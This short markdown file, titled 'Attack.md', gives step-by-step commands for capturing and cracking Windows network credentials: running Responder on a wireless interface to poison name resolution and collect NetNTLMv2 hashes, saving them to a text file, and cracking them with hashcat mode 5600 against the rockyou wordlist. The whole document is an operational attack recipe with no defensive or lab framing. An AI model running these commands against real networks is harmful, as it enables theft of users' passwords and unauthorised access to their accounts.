## Attack.md

hashcat --help | grep NTLM

Step 1 Run Responder
sudo responder -I wlan0 -dwP

Step 2 Capture the Hashes
Once the hashes have been captured save the hashes to a txt file

nano hashes.txt 
Paste hashes in the txt file and save

Step 3 Crack Hash
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt --show -O
